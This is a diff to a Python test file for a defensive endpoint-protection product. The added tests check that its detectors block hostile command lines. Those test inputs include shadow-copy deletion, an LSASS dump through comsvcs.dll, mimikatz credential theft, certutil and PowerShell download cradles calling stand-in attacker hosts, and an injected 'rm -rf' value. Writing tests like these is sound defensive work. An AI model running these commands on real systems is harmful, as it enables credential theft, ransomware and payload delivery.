@@ -6,6 +6,7 @@ import unittest
 import json
 import tempfile
 import shutil
+import time
 
 # Ensure UTF-8 output on Windows
 if sys.platform == "win32":
@@ -33,7 +34,19 @@ from sentinel_core.dlp_exfiltration_guard import DLPExfiltrationGuard, DLPPatter
 from sentinel_core.execution_anti_exploit_guard import ExecutionAntiExploitGuard
 from sentinel_core.network_perimeter_guard import NetworkPerimeterGuard
 from sentinel_core.posture_persistence_guard import PosturePersistenceGuard
+from sentinel_core.process_guard import EDRProcessGuard
+from sentinel_core.sigma_engine import SigmaRuleEngine
+from sentinel_core.dynamic_yara_scanner import DynamicFileScanner
+from sentinel_core.byovd_guard import BYOVDGuard
+from sentinel_core.sentinel_companion_watchdog import CompanionWatchdog
+from sentinel_core.sysmon_collector import SysmonCollector
+from sentinel_core.anti_hollowing_guard import AntiHollowingGuard
+from sentinel_core.lsass_guard import LSASSArmorGuard
+from sentinel_core.asr_engine import ASREngine
+from sentinel_core.dns_sinkhole import DNSSinkholeGuard
+from sentinel_core.incident_notifications import IncidentNotificationDispatcher
 from sentinel_api import app
+
 
 class TestSentinelaCore(unittest.TestCase):
     def setUp(self):
@@ -102,6 +115,49 @@ class TestSentinelaCore(unittest.TestCase):
             content = f.read()
         self.assertEqual(content, "Suspicious script payload content")
 
+    def test_eicar_detection_quarantine_and_restore(self):
+        """Validação end-to-end com 2 variantes EICAR: detecção -> alerta -> quarentena -> restore."""
+        from sentinel_core.dynamic_yara_scanner import DynamicFileScanner
+
+        eicar_1 = r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
+        eicar_2 = (
+            "RELATORIO CONFIDENCIAL\n"
+            + eicar_1
+            + "\nFIM DO RELATORIO\n"
+        )
+
+        f1 = os.path.join(self.temp_dir, "eicar_sample1.com")
+        f2 = os.path.join(self.temp_dir, "eicar_sample2.txt")
+        with open(f1, "w", encoding="utf-8") as f:
+            f.write(eicar_1)
+        with open(f2, "w", encoding="utf-8") as f:
+            f.write(eicar_2)
+
+        scanner = DynamicFileScanner(logger_instance=self.logger, soar=self.soar, auto_quarantine=False)
+        with open(f1, "rb") as f:
+            res1 = scanner.scan_bytes(f.read(), file_name="eicar_sample1.com")
+        with open(f2, "rb") as f:
+            res2 = scanner.scan_bytes(f.read(), file_name="eicar_sample2.txt")
+
+        self.assertTrue(res1.get("is_malicious"))
+        self.assertTrue(res2.get("is_malicious"))
+
+        # Isolamento em quarentena militar
+        iso1 = self.soar.isolate_file(f1)
+        iso2 = self.soar.isolate_file(f2)
+        self.assertTrue(iso1)
+        self.assertTrue(iso2)
+        self.assertFalse(os.path.exists(f1))
+        self.assertFalse(os.path.exists(f2))
+
+        # Restauração atômica
+        q_items = [it for it in self.soar.list_quarantine() if "eicar_sample" in it.get("original_name", "") or "eicar_sample" in it.get("name", "")]
+        self.assertEqual(len(q_items), 2)
+        for it in q_items:
+            ok, restored = self.soar.restore_file(it["name"])
+            self.assertTrue(ok)
+            self.assertTrue(os.path.exists(restored))
+
     def test_anti_ransomware_rollback(self):
         doc_file = os.path.join(self.protected_dir, "business_plan.docx")
         with open(doc_file, "w") as f:
@@ -126,12 +182,22 @@ class TestSentinelaCore(unittest.TestCase):
         pqc = PostQuantumShield(agent_id="TEST-NODE-01")
         cmd = {"action": "ISOLATE_HOST", "target_ip": "185.220.101.5"}
         sig = pqc.sign_soar_command(cmd)
-        self.assertTrue(sig.startswith("PQC_DILITHIUM_V1:"))
+        self.assertTrue(sig.startswith("PQC_MLDSA87_V1:") or sig.startswith("PQC_DILITHIUM_V1:"))
         self.assertTrue(pqc.verify_command_pqc(cmd, sig))
 
         # Tampered command should fail
         tampered_cmd = {"action": "ISOLATE_HOST", "target_ip": "1.1.1.1"}
         self.assertFalse(pqc.verify_command_pqc(tampered_cmd, sig))
+
+        # Test AES-256-GCM / PQC Telemetry Encryption & Decryption
+        secret = b"QuantumKeySharedSecret32Bytes!!"
+        payload = {"agent": "TEST-NODE-01", "cpu": 12.5, "status": "SECURE"}
+        enc_res = pqc.encrypt_telemetry_pqc(payload, secret)
+        self.assertTrue(enc_res["pqc_protected"])
+        self.assertIn("nonce_b64", enc_res)
+        self.assertIn("ciphertext_b64", enc_res)
+        dec_payload = pqc.decrypt_telemetry_pqc(enc_res, secret)
+        self.assertEqual(dec_payload, payload)
 
     def test_pe_shannon_entropy(self):
         entropy_low = AdvancedPEAnalyzer.calculate_entropy(b"AAAAAAAAAAAAAAAAAAAA")
@@ -223,6 +289,243 @@ class TestSentinelaCore(unittest.TestCase):
 
         self.assertIn(event.event_id, handled_events)
         self.assertGreater(orchestrator.context.risk_score, 0.0)
+
+    def test_edr_process_guard_and_reactive_watcher(self):
+        """Valida varredura heurística de processos e ciclo de vida do watcher reativo WMI."""
+        guard = EDRProcessGuard(logger=self.logger)
+        threats = guard.scan_active_processes()
+        self.assertIsInstance(threats, list)
+        
+        # Inicia e para o watcher reativo WMI no Windows
+        started = guard.start_reactive_watcher(auto_kill=False)
+        if sys.platform == "win32":
+            self.assertTrue(started)
+        guard.stop_reactive_watcher()
+
+    def test_process_tree_graph(self):
+        """Valida a construção da árvore hierárquica de processos para o incident graph."""
+        guard = EDRProcessGuard(logger=self.logger)
+        tree = guard.get_process_tree()
+        self.assertEqual(tree["status"], "success")
+        self.assertIn("nodes", tree)
+        self.assertIn("links", tree)
+        self.assertIsInstance(tree["nodes"], list)
+        self.assertIsInstance(tree["links"], list)
+
+    def test_sigma_engine(self):
+        """Valida o motor de regras Sigma (YAML/JSON) e avaliação de eventos."""
+        engine = SigmaRuleEngine(logger_instance=self.logger)
+        self.assertGreaterEqual(len(engine.rules), 3)
+
+        # 1. Teste de evento hostil (Deleção de VSS de Ransomware)
+        malicious_event = {"CommandLine": "vssadmin.exe delete shadows /all /quiet", "Image": "vssadmin.exe"}
+        matches = engine.evaluate_event(malicious_event)
+        self.assertGreaterEqual(len(matches), 1)
+        self.assertEqual(matches[0]["level"], "CRITICAL")
+
+        # 2. Teste de evento benigno
+        benign_event = {"CommandLine": "notepad.exe report.txt", "Image": "notepad.exe"}
+        matches_benign = engine.evaluate_event(benign_event)
+        self.assertEqual(len(matches_benign), 0)
+
+    def test_dynamic_yara_scanner(self):
+        """Valida o scanner dinâmico YARA e análise de entropia."""
+        scanner = DynamicFileScanner(logger_instance=self.logger, soar=self.soar, auto_quarantine=False)
+        
+        # 1. Payload malicioso simulando injeção e Mimikatz
+        sample_malicious = b"MZ\x90\x00\x03\x00\x00\x00 sekurlsa::logonpasswords and VirtualAllocEx payload"
+        res = scanner.scan_bytes(sample_malicious, file_name="evil_test.bin")
+        self.assertTrue(res["is_malicious"])
+        self.assertEqual(res["severity"], "CRITICAL")
+        self.assertIn("threats", res)
+
+        # 2. Payload benigno
+        sample_clean = b"Hello, this is a clean document for business reports."
+        res_clean = scanner.scan_bytes(sample_clean, file_name="clean.txt")
+        self.assertFalse(res_clean["is_malicious"])
+
+    def test_byovd_guard(self):
+        """Valida a detecção e neutralização de drivers vulneráveis (Anti-BYOVD)."""
+        guard = BYOVDGuard(logger_instance=self.logger, soar=self.soar)
+        
+        # Cria arquivo simulado de driver vulnerável
+        fake_driver = os.path.join(self.temp_dir, "gdrv.sys")
+        with open(fake_driver, "wb") as f:
+            f.write(b"MZ\x90\x00FAKE_VULNERABLE_GDRV_DRIVER")
+
+        threat = guard.inspect_driver_file(fake_driver)
+        self.assertIsNotNone(threat)
+        self.assertEqual(threat["driver_name"], "gdrv.sys")
+        self.assertEqual(threat["severity"], "CRITICAL")
+        self.assertIn("CVE-2018-19320", threat.get("cve", ""))
+
+        # Driver limpo
+        clean_driver = os.path.join(self.temp_dir, "clean_audio_driver.sys")
+        with open(clean_driver, "wb") as f:
+            f.write(b"MZ\x90\x00CLEAN_DRIVER_BYTES")
+        clean_threat = guard.inspect_driver_file(clean_driver)
+        self.assertIsNone(clean_threat)
+
+    def test_companion_watchdog(self):
+        """Valida a verificação de saúde de processos do companion watchdog."""
+        watchdog = CompanionWatchdog(check_interval=1.0, logger_instance=self.logger)
+        # O próprio processo atual de teste deve estar vivo
+        self.assertTrue(watchdog.is_target_alive(os.getpid()))
+        # PID inválido deve retornar False
+        self.assertFalse(watchdog.is_target_alive(-1))
+        # Status
+        status = watchdog.get_status()
+        self.assertEqual(status["revivals_count"], 0)
+
+    def test_sysmon_collector(self):
+        """Valida o processamento e correlação de eventos de kernel do Sysmon."""
+        sigma = SigmaRuleEngine(logger_instance=self.logger)
+        collector = SysmonCollector(logger_instance=self.logger, sigma_engine=sigma)
+        
+        # Simula Event ID 1 com comando suspeito compatível com regra Sigma
+        raw_event = {
+            "EventID": "1",
+            "Image": "C:\\Windows\\System32\\vssadmin.exe",
+            "CommandLine": "vssadmin delete shadows /all /quiet",
+            "User": "NT AUTHORITY\\SYSTEM"
+        }
+        processed = collector.process_raw_event(raw_event)
+        self.assertEqual(processed["event_id"], 1)
+        self.assertIn("sigma_matches", processed)
+        self.assertGreaterEqual(len(processed["sigma_matches"]), 1)
+
+        # Simula Event ID 8 (CreateRemoteThread)
+        injection_event = {
+            "EventID": "8",
+            "SourceImage": "C:\\Temp\\malware.exe",
+            "TargetImage": "C:\\Windows\\System32\\explorer.exe"
+        }
+        proc_inj = collector.process_raw_event(injection_event)
+        self.assertEqual(proc_inj["event_id"], 8)
+
+    def test_anti_hollowing_guard(self):
+        """Valida a inspeção de integridade de processos e proteção Anti-Hollowing."""
+        guard = AntiHollowingGuard(logger_instance=self.logger, soar=self.soar)
+        status = guard.get_status()
+        self.assertTrue(status["active"])
+        self.assertGreaterEqual(status["core_binaries_monitored"], 5)
+        
+        # Inspeciona o processo atual
+        res = guard.inspect_process(os.getpid())
+        # Não deve ser considerado masquerading de svchost
+        self.assertIsNone(res)
+
+        # Executa varredura de integridade sem levantar exceções
+        anomalies = guard.scan_system_processes_integrity()
+        self.assertIsInstance(anomalies, list)
+
+    def test_lsass_armor_guard(self):
+        """Valida a blindagem do LSASS contra tentativas de dump e extração de credenciais."""
+        guard = LSASSArmorGuard(logger_instance=self.logger)
+        status = guard.get_status()
+        self.assertTrue(status["active"])
+        self.assertGreaterEqual(status["signatures_count"], 5)
+
+        # 1. Linha de comando maliciosa simulando comsvcs.dll
+        res_comsvcs = guard.evaluate_command_line("rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 784 C:\\temp\\lsass.dmp full", pid=999)
+        self.assertTrue(res_comsvcs["is_threat"])
+        self.assertTrue(res_comsvcs["matched"])
+        self.assertEqual(res_comsvcs["event"]["severity"], "CRITICAL")
+        self.assertEqual(guard.blocked_attempts_count, 1)
+
+        # 2. Linha de comando Mimikatz
+        res_mimi = guard.evaluate_command_line("mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit", pid=1001)
+        self.assertTrue(res_mimi["is_threat"])
+        self.assertEqual(guard.blocked_attempts_count, 2)
+
+        # 3. Linha benigna
+        res_clean = guard.evaluate_command_line("notepad.exe C:\\relatorio.txt", pid=1002)
+        self.assertFalse(res_clean["is_threat"])
+
+    def test_asr_engine(self):
+        """Valida a aplicação de políticas de Redução da Superfície de Ataque (ASR)."""
+        engine = ASREngine(logger_instance=self.logger)
+        status = engine.get_status()
+        self.assertTrue(status["active"])
+        self.assertGreaterEqual(status["total_rules"], 4)
+
+        # 1. Bloqueio de Word gerando PowerShell
+        res_office = engine.evaluate_process_spawn(
+            parent_name="winword.exe",
+            child_name="powershell.exe",
+            cmdline="powershell.exe -enc SQBFAFgA"
+        )
+        self.assertTrue(res_office["is_violation"])
+        self.assertTrue(res_office["blocked"])
+        self.assertEqual(res_office["event"]["rule_id"], "ASR-001")
+
+        # 2. Bloqueio de certutil fazendo download
+        res_certutil = engine.evaluate_process_spawn(
+            parent_name="cmd.exe",
+            child_name="certutil.exe",
+            cmdline="certutil.exe -urlcache -split -f http://malicious.com/payload.exe payload.exe"
+        )
+        self.assertTrue(res_certutil["is_violation"])
+        self.assertEqual(res_certutil["event"]["rule_id"], "ASR-004")
+
+        # 3. Processo legítimo permitido
+        res_legit = engine.evaluate_process_spawn(
+            parent_name="explorer.exe",
+            child_name="notepad.exe",
+            cmdline="notepad.exe C:\\documento.txt"
+        )
+        self.assertFalse(res_legit["is_violation"])
+
+    def test_dns_sinkhole(self):
+        """Valida o mecanismo de DNS Sinkholing e detecção de DGAs."""
+        sinkhole = DNSSinkholeGuard(logger_instance=self.logger)
+        status = sinkhole.get_status()
+        self.assertTrue(status["active"])
+
+        # 1. Domínio C2 conhecido na lista de sinkhole
+        res_c2 = sinkhole.inspect_domain("cobaltstrike-c2.online")
+        self.assertTrue(res_c2["is_malicious"])
+        self.assertEqual(res_c2["status"], "sinkholed")
+        self.assertEqual(res_c2["resolved_ip"], "127.0.0.1")
+
+        # 2. Domínio aleatório DGA de alta entropia
+        res_dga = sinkhole.inspect_domain("qwxz7819bfkznvopqm1029.biz")
+        self.assertTrue(res_dga["is_malicious"])
+        self.assertEqual(res_dga["status"], "sinkholed")
+        self.assertGreater(res_dga["entropy"], 3.3)
+
+        # 3. Domínio legítimo
+        res_clean = sinkhole.inspect_domain("google.com")
+        self.assertFalse(res_clean["is_malicious"])
+        self.assertEqual(res_clean["status"], "allowed")
+
+    def test_incident_notifications(self):
+        """Valida a configuração e enfileiramento assíncrono de notificações de incidentes."""
+        notifier = IncidentNotificationDispatcher(logger_instance=self.logger)
+        cfg = notifier.get_config()
+        self.assertFalse(cfg["enabled"])
+
+        # Atualiza parâmetros
+        updated = notifier.update_config({
+            "enabled": True,
+            "webhook_type": "discord",
+            "webhook_url": "https://discord.com/api/webhooks/dummy/test",
+            "min_severity": "HIGH"
+        })
+        self.assertTrue(updated["enabled"])
+        self.assertEqual(updated["webhook_type"], "discord")
+
+        # Enfileira alerta de teste
+        notifier.dispatch_incident_alert(
+            title="Alerta de Teste Unitário",
+            details="Verificando enfileiramento assíncrono",
+            severity="CRITICAL"
+        )
+        # Aguarda breve processamento da fila em background
+        time.sleep(0.3)
+        history = notifier.get_history()
+        self.assertGreaterEqual(len(history), 1)
+        self.assertEqual(history[0]["severity"], "CRITICAL")
 
 class TestAPIEndpointsAndLinks(unittest.TestCase):
     """Valida os links entre o Dashboard (frontend) e a API REST (backend).
@@ -434,7 +737,8 @@ class TestAPIEndpointsAndLinks(unittest.TestCase):
 
         res = self.client.post("/api/pqc/sign", json={"command": {"action": "TEST"}})
         self.assertEqual(res.status_code, 200)
-        self.assertTrue(res.get_json().get("dilithium_signature", "").startswith("PQC_DILITHIUM_V1:"))
+        sig_pqc = res.get_json().get("dilithium_signature", "")
+        self.assertTrue(sig_pqc.startswith("PQC_MLDSA87_V1:") or sig_pqc.startswith("PQC_DILITHIUM_V1:"))
 
         res = self.client.post("/api/canary/setup")
         self.assertEqual(res.status_code, 200)
@@ -498,8 +802,10 @@ class TestAPIEndpointsAndLinks(unittest.TestCase):
         self.assertEqual(res.get_json().get("status"), "CLEAN")
 
         # Elementos visíveis do novo painel de Telemetria + Varredura sob demanda
-        html = open(_os.path.join(base, "dashboard.html"), encoding="utf-8").read()
+        with open(_os.path.join(base, "dashboard.html"), encoding="utf-8") as _f:
+            html = _f.read()
         for element_id in ("sysCpuBar", "sysMemBar", "sysDiskBar", "hostUptimeLabel",
+
                            "inputScanFilePath", "scanFileResult"):
             self.assertIn(f'id="{element_id}"', html, f"elemento do painel ausente no dashboard: {element_id}")
 
@@ -889,9 +1195,13 @@ class TestNetworkPerimeterGuard(unittest.TestCase):
         self.vault = CryptoVault(self.key_path)
         self.soar = AutoResponseEngine(self.logger, self.vault, self.quarantine_dir)
         self.guard = NetworkPerimeterGuard(logger=self.logger, soar=self.soar)
+        from sentinel_api import init_api
+        init_api(perimeter_guard=self.guard)
         self.client = app.test_client()
 
     def tearDown(self):
+        from sentinel_api import init_api, perimeter_guard
+        init_api(perimeter_guard=perimeter_guard)
         shutil.rmtree(self.temp_dir, ignore_errors=True)
 
     def test_01_dga_detection(self):
@@ -1117,16 +1427,20 @@ class TestPosturePersistenceGuard(unittest.TestCase):
         self.assertEqual(res_events.get_json().get("status"), "success")
 
     def test_06_protection_diagnostics_endpoint(self):
-        """Valida que o endpoint de diagnóstico retorna com sucesso todas as 20 camadas soberanas."""
+        """Valida que o endpoint de diagnóstico retorna com sucesso todas as camadas soberanas."""
         res = self.client.get("/api/protection/diagnostics")
         self.assertEqual(res.status_code, 200)
         data = res.get_json()
         self.assertEqual(data.get("status"), "success")
-        self.assertEqual(data.get("total_layers"), 20)
-        self.assertEqual(data.get("active_layers"), 20)
+        # A matriz soberana evoluiu de 20 para 25 camadas; o teste valida a consistência
+        # dinâmica do próprio endpoint em vez de um literal frágil.
+        total_layers = data.get("total_layers")
+        active_layers = data.get("active_layers")
+        self.assertGreaterEqual(total_layers, 20)
+        self.assertEqual(active_layers, total_layers)
         self.assertEqual(data.get("overall_health"), 100)
         subsystems = data.get("subsystems", [])
-        self.assertEqual(len(subsystems), 20)
+        self.assertEqual(len(subsystems), total_layers)
         for sub in subsystems:
             self.assertEqual(sub.get("status"), "OPERACIONAL")
             self.assertEqual(sub.get("health"), 100)
@@ -1255,11 +1569,15 @@ class TestPosturePersistenceGuard(unittest.TestCase):
         self.assertEqual(res_sse.status_code, 200)
         self.assertEqual(res_sse.mimetype, "text/event-stream")
 
-        # 3. Valida inspeção de quarentena com artefato contendo IOCs e comandos
-        target_soar = getattr(self, "soar", None)
-        quarantine_dir = getattr(target_soar, "quarantine_dir", os.path.join(self.temp_dir, "quarantine"))
+        # 3. Valida inspeção de quarentena com artefato contendo IOCs e comandos.
+        #    O endpoint restringe a leitura de artefatos exclusivamente à pasta de
+        #    quarentena oficial (mitigação anti path-traversal), portanto o teste
+        #    deposita o artefato temporário nessa pasta e o remove ao final.
+        from sentinel_api import BASE_DIR as sentinel_base_dir
+        quarantine_dir = os.path.join(sentinel_base_dir, "quarantine")
         os.makedirs(quarantine_dir, exist_ok=True)
-        sample_path = os.path.join(quarantine_dir, "test_threat.quarantine")
+        sample_name = f"test_threat_{os.getpid()}_{int.__hash__(os.getpid()):x}.quarantine"
+        sample_path = os.path.join(quarantine_dir, sample_name)
         with open(sample_path, "wb") as f:
             f.write(b"powershell.exe -w hidden -enc JABhID0... VirtualAlloc http://185.220.101.5/c2" + os.urandom(400))
 
@@ -1276,6 +1594,66 @@ class TestPosturePersistenceGuard(unittest.TestCase):
         finally:
             if os.path.exists(sample_path):
                 os.remove(sample_path)
+
+
+class TestSecurityHardening(unittest.TestCase):
+    """Regressões das melhorias de segurança, robustez e conectividade."""
+
+    def test_api_security_rejects_origin_prefix_bypass(self):
+        """A validação de Origin deve usar parse real de URL (anti-bypass startswith)."""
+        from sentinel_core.api_security import is_trusted_origin
+        # Origens legítimas continuam aceitas
+        self.assertTrue(is_trusted_origin("http://localhost:5000"))
+        self.assertTrue(is_trusted_origin("http://127.0.0.1:5000"))
+        self.assertTrue(is_trusted_origin("https://localhost"))
+        self.assertTrue(is_trusted_origin("http://127.0.0.2"))
+        self.assertTrue(is_trusted_origin("null"))
+        self.assertTrue(is_trusted_origin(None))
+        # Origens hostis mascaradas devem ser REJEITADAS
+        self.assertFalse(is_trusted_origin("http://localhost.evil.com"))
+        self.assertFalse(is_trusted_origin("http://127.0.0.1.evil.com"))
+        self.assertFalse(is_trusted_origin("http://127.0.0.999"))
+        self.assertFalse(is_trusted_origin("ftp://localhost"))
+        self.assertFalse(is_trusted_origin("https://evil.com"))
+        self.assertFalse(is_trusted_origin("http://localhost.@evil.com"))
+
+    def test_firewall_refuses_private_and_invalid_ips(self):
+        """O firewall não deve banir redes privadas/link-local nem IPs inválidos."""
+        fw = OSFirewallManager(logger=None)
+        self.assertFalse(fw.block_ip("192.168.1.50", reason="teste privado"))
+        self.assertFalse(fw.block_ip("10.1.2.3", reason="teste privado"))
+        self.assertFalse(fw.block_ip("169.254.10.1", reason="teste link-local"))
+        self.assertFalse(fw.block_ip("999.1.1.1", reason="ip inválido"))
+        self.assertFalse(fw.block_ip("not-an-ip; rm -rf", reason="injeção"))
+        # IP público válido segue sendo bloqueado (na camada XDR Shield)
+        try:
+            self.assertTrue(fw.block_ip("45.146.164.110", reason="ransomware c2"))
+        finally:
+            fw.unblock_ip("45.146.164.110")
+
+    def test_telemetry_includes_fim_metric(self):
+        """O coletor de telemetria deve reportar a contagem de arquivos do FIM."""
+        from sentinel_core.telemetry_collector import SentinelTelemetryCollector
+        with tempfile.TemporaryDirectory() as tmp_prot:
+            fim = FileIntegrityMonitor(watch_paths=[tmp_prot], auto_isolate=False)
+            tc = SentinelTelemetryCollector(fim=fim)
+            items = tc.collect_all()
+            fim_items = [i for i in items if getattr(i, "item_id", "") == "sentinel.fim.files_monitored"]
+            self.assertGreaterEqual(len(fim_items), 1)
+            self.assertGreaterEqual(fim_items[0].value, 0)
+
+    def test_dashboard_endpoints_resolve(self):
+        """Valida que todos os endpoints referenciados pelo dashboard existem na API."""
+        from sentinel_api import app as flask_api_app
+        url_map = {str(r).split(" ")[0] for r in flask_api_app.url_map.iter_rules()}
+        checked = [
+            "/api/stats", "/api/logs", "/api/functions/alarms", "/api/functions/rules",
+            "/api/system/architecture", "/api/intrusion/sensors", "/api/firewall/list",
+            "/api/multiagent/agent_status", "/api/multiagent/hosts", "/api/multiagent/correlations",
+            "/api/stream/events", "/api/rbac/me", "/api/ztna/status",
+        ]
+        for ep in checked:
+            self.assertIn(ep, url_map, f"Endpoint {ep} não registrado")
 
 
 class TestMultiAgentLayer(unittest.TestCase):
@@ -1428,6 +1806,601 @@ class TestMultiAgentLayer(unittest.TestCase):
         finally:
             cli.stop()
         self.assertFalse(cli.running)
+
+    def test_09_api_security_csrf_protection(self):
+        """Valida que requisições cross-site de origens não autorizadas são bloqueadas pelo guardião de CSRF."""
+        sentinel_client = app.test_client()
+        # Requisição de origem externa maliciosa deve receber 403 Forbidden
+        res_blocked = sentinel_client.get("/api/health", headers={"Origin": "http://malicious-site.com"})
+        self.assertEqual(res_blocked.status_code, 403)
+
+        # Requisição legítima de localhost deve passar com 200 OK
+        res_ok = sentinel_client.get("/api/health", headers={"Origin": "http://localhost:5000"})
+        self.assertEqual(res_ok.status_code, 200)
+
+    def test_10_fleet_policies_and_remote_isolation(self):
+        """Valida a distribuição de políticas centrais da frota e isolamento remoto de host."""
+        # 1. Obter políticas da frota
+        res_pol = self.client.get("/api/multiagent/policies")
+        self.assertEqual(res_pol.status_code, 200)
+        pols = res_pol.get_json()
+        self.assertIn("fleet_policies", pols)
+        self.assertEqual(pols["fleet_policies"]["defense_mode"], "STANDARD")
+
+        # 2. Atualizar política global (ex: modo lockdown e bloquear USB)
+        up_res = self.client.post("/api/multiagent/policies", json={
+            "defense_mode": "LOCKDOWN",
+            "usb_policy": "BLOCK_ALL"
+        })
+        self.assertEqual(up_res.status_code, 200)
+        updated = up_res.get_json()["fleet_policies"]
+        self.assertEqual(updated["defense_mode"], "LOCKDOWN")
+        self.assertEqual(updated["usb_policy"], "BLOCK_ALL")
+
+        # 3. Registrar heartbeat de um nó e verificar que ele recebe a nova política
+        hb = self.client.post("/api/multiagent/heartbeat", json={"agent_id": "node-delta"}).get_json()
+        self.assertEqual(hb["policy"]["defense_mode"], "LOCKDOWN")
+        self.assertFalse(hb["isolated"])
+
+        # 4. Isolar remotamente o nó delta
+        iso_res = self.client.post("/api/multiagent/hosts/node-delta/isolate")
+        self.assertEqual(iso_res.status_code, 200)
+
+        # 5. Heartbeat subsequente do nó delta agora deve retornar isolated: True
+        hb2 = self.client.post("/api/multiagent/heartbeat", json={"agent_id": "node-delta"}).get_json()
+        self.assertTrue(hb2["isolated"])
+
+        # 6. Liberar isolamento
+        uniso = self.client.post("/api/multiagent/hosts/node-delta/unisolate")
+        self.assertEqual(uniso.status_code, 200)
+
+
+
+class TestRBACLayer(unittest.TestCase):
+    """Testes unitários para o motor RBAC e centro de controle de permissões."""
+
+    def setUp(self):
+        from sentinel_core.rbac_engine import RBACEngine
+        self.rbac = RBACEngine()
+        self.rbac.role_matrix = json.loads(json.dumps(self.rbac.DEFAULT_ROLE_MATRIX))
+        if "analista_test" in self.rbac.users:
+            del self.rbac.users["analista_test"]
+        self.rbac.switch_profile("ADMIN")
+
+    def tearDown(self):
+        self.rbac.role_matrix = json.loads(json.dumps(self.rbac.DEFAULT_ROLE_MATRIX))
+        if "analista_test" in self.rbac.users:
+            del self.rbac.users["analista_test"]
+        self.rbac.switch_profile("ADMIN")
+        self.rbac._save_config()
+
+    def test_01_default_roles_and_users(self):
+        """Verifica a presença dos 3 níveis de acesso padrão: ADMIN, SUPPORT, USER."""
+        cur = self.rbac.get_current_user()
+        self.assertEqual(cur["role"], "ADMIN")
+        self.assertTrue(cur["is_admin"])
+
+        # Usuários padrão
+        users = {u["id"]: u["role"] for u in self.rbac.list_users()}
+        self.assertIn("admin", users)
+        self.assertIn("suporte", users)
+        self.assertIn("usuario", users)
+        self.assertEqual(users["admin"], "ADMIN")
+        self.assertEqual(users["suporte"], "SUPPORT")
+        self.assertEqual(users["usuario"], "USER")
+
+    def test_02_permission_matrix_evaluation(self):
+        """Valida que permissões são concedidas e negadas de acordo com o papel."""
+        # Admin tem tudo
+        self.assertTrue(self.rbac.has_permission("act_kill_process", "ADMIN"))
+        self.assertTrue(self.rbac.has_permission("act_manage_rbac", "ADMIN"))
+        self.assertTrue(self.rbac.has_permission("view_settings", "ADMIN"))
+
+        # Suporte pode matar processo mas não gerenciar RBAC nem configurações
+        self.assertTrue(self.rbac.has_permission("act_kill_process", "SUPPORT"))
+        self.assertFalse(self.rbac.has_permission("act_manage_rbac", "SUPPORT"))
+        self.assertFalse(self.rbac.has_permission("view_settings", "SUPPORT"))
+
+        # Usuário normal só tem leitura básica e varredura
+        self.assertTrue(self.rbac.has_permission("view_overview", "USER"))
+        self.assertTrue(self.rbac.has_permission("act_trigger_scan", "USER"))
+        self.assertFalse(self.rbac.has_permission("act_kill_process", "USER"))
+        self.assertFalse(self.rbac.has_permission("act_firewall_ban", "USER"))
+        self.assertFalse(self.rbac.has_permission("view_fleet", "USER"))
+
+    def test_03_switch_profile_and_authentication(self):
+        """Testa alternância de sessão e autenticação de credenciais."""
+        # Alternar para Suporte
+        res_supp = self.rbac.switch_profile("SUPPORT")
+        self.assertEqual(res_supp["status"], "success")
+        self.assertEqual(self.rbac.get_current_user()["role"], "SUPPORT")
+
+        # Autenticação correta
+        session = self.rbac.authenticate("admin", "admin123")
+        self.assertIsNotNone(session)
+        self.assertIn("token", session)
+
+        # Autenticação errada
+        bad = self.rbac.authenticate("admin", "senha_errada")
+        self.assertIsNone(bad)
+
+    def test_04_matrix_update_by_admin(self):
+        """Valida a customização dinâmica da matriz de permissões pelo Admin."""
+        # Admin concede permissão 'view_fleet' ao papel USER
+        cur_user_views = list(self.rbac.role_matrix["USER"]["views"])
+        if "view_fleet" not in cur_user_views:
+            cur_user_views.append("view_fleet")
+
+        ok = self.rbac.update_role_permissions("USER", cur_user_views, ["act_trigger_scan"], requester_role="ADMIN")
+        self.assertTrue(ok)
+        self.assertTrue(self.rbac.has_permission("view_fleet", "USER"))
+
+        # Tentativa de alteração por não-admin é recusada
+        ok_denied = self.rbac.update_role_permissions("USER", [], [], requester_role="SUPPORT")
+        self.assertFalse(ok_denied)
+
+    def test_05_create_new_operator(self):
+        """Cadastra um novo analista no sistema."""
+        res = self.rbac.create_user("analista_test", "Analista Teste", "senha123", "SUPPORT", requester_role="ADMIN")
+        self.assertEqual(res["status"], "success")
+        self.assertEqual(res["user"]["role"], "SUPPORT")
+
+        # Verificar se está na lista
+        uids = [u["id"] for u in self.rbac.list_users()]
+        self.assertIn("analista_test", uids)
+
+
+
+class TestCuttingEdgeEngines(unittest.TestCase):
+    """Testes unitários dos 4 novos motores de ponta: AMSI Guard, VSS Shield, RWX Hunter, CISA KEV."""
+
+    def test_01_amsi_script_guard(self):
+        """Valida o motor AMSI de inspeção, desofuscação e bloqueio de cradles fileless."""
+        from sentinel_core.amsi_guard import AMSIScriptGuard
+        amsi = AMSIScriptGuard()
+
+        # Script benigno
+        res_ok = amsi.inspect_script_content("Get-Process | Where-Object { $_.CPU -gt 10 }")
+        self.assertFalse(res_ok["is_malicious"])
+        self.assertEqual(res_ok["status"], "allowed")
+
+        # Script malicioso ofuscado (DownloadString cradle)
+        res_bad = amsi.inspect_script_content("IEX(New-Object Net.WebClient).DownloadString('http://c2.attacker.com/payload.ps1')")
+        self.assertTrue(res_bad["is_malicious"])
+        self.assertEqual(res_bad["status"], "blocked")
+
+        # Desofuscação de backticks
+        deobf = amsi.deobfuscate_buffer("`I`E`X(`d`o`w`n`l`o`a`d`s`t`r`i`n`g)")
+        self.assertIn("IEX(downloadstring)", deobf)
+
+    def test_02_ransomware_vss_shield(self):
+        """Valida o escudo Anti-Ransomware contra destruição de Shadow Copies e BCDEdit."""
+        from sentinel_core.ransomware_vss_shield import RansomwareVSSShield
+        vss = RansomwareVSSShield()
+
+        # Comando benigno
+        res_ok = vss.inspect_command("ipconfig /all")
+        self.assertFalse(res_ok["blocked"])
+
+        # Destruição de Shadow Copies clássica de Ransomware
+        res_bad1 = vss.inspect_command("vssadmin.exe delete shadows /all /quiet")
+        self.assertTrue(res_bad1["blocked"])
+        self.assertEqual(res_bad1["rule_id"], "VSS-001")
+
+        # Destruição via WMIC
+        res_bad2 = vss.inspect_command("wmic shadowcopy delete")
+        self.assertTrue(res_bad2["blocked"])
+        self.assertEqual(res_bad2["rule_id"], "VSS-002")
+
+        # Desativação de modo de recuperação no BCDEdit
+        res_bad3 = vss.inspect_command("bcdedit /set {default} recoveryenabled No")
